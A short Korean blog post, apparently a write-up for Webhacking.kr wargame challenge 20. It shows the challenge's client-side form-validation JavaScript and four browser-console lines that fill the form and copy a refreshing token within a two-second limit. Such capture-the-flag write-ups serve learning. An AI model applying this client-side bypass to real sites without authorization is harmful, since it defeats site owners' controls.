---
layout: post
title: ! "[Webhacking.kr] 20"
categories: [Webhacking.kr]
excerpt: " "
comments: true
share: true
tags:
  - Web-hacking
  - webhacking.kr
  - write-up
---

![](/assets/posts/webhackingkr/20.png)

20번 코드를 보면 time limit:2, code칸의 버튼은 새로고침을 할 때마다 value가 바뀐다.

```js
function ck()
{

if(lv5frm.id.value=="") { lv5frm.id.focus(); return; }
if(lv5frm.cmt.value=="") { lv5frm.cmt.focus(); return; }
if(lv5frm.hack.value=="") { lv5frm.hack.focus(); return; }
if(lv5frm.hack.value!=lv5frm.attackme.value) { lv5frm.hack.focus(); return; }

lv5frm.submit();

}
```

time limit이 2초이므로 2초안에 다 해야된다는 것인데
크롬이나 IE의 콘솔창을 키고 문제 페이지를 새로고침, 2초 안에 아래의 자바스크립트를 실행시키면 된다. 
![](/assets/posts/webhackingkr/20_console.png)

```js
javascript:lv5frm.id.value="a";
javascript:lv5frm.cmt.value="a";
javascript:lv5frm.hack.value=lv5frm.attackme.value;
javasript:lv5frm.submit();
```

![](/assets/posts/webhackingkr/20_clear.png)




